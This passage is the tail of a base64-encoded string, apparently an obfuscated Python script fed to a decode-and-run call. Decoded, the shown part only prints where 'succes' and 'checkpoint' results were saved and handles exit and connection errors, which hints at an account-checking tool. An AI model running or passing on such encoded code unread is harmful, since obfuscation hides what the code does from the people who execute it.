gcmVzdWx0ICE9IDA6DQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiXG5bXDAzM1sxOzMybeKclFwwMzNbMG0gRG9uZS4gZmlsZSBzYXZlZCBpbiA6ICIpDQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiICAgICAgICAtIHN1Y2NlcyA6IHJlc3VsdHMtc3VjY2VzLnR4dCIpDQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiICAgICAgICAtIGNoZWNrcG9pbnQgOiByZXN1bHRzLWNoZWNrLnR4dCIpDQogICAgICAgICAgICAgICAgICAgICAgICBleGl0KCIjIHRoYW5rcyBmb3IgdXNpbmcgdGhpcyB0b29scyIpDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJcbiMgRG9uZSIpDQogICAgICAgICAgICAgICAgICAgICAgICBleGl0KCIjIG5vIHJlc3VsdCIpDQogICAgICAgIGV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOg0KICAgICAgICAgICAgICAgIGV4aXQoKQ0KICAgICAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQogICAgICAgICAgICAgICAgZXhpdCgiIyBDb25uZWN0aW9uIGVycm9yIikNCg=='))
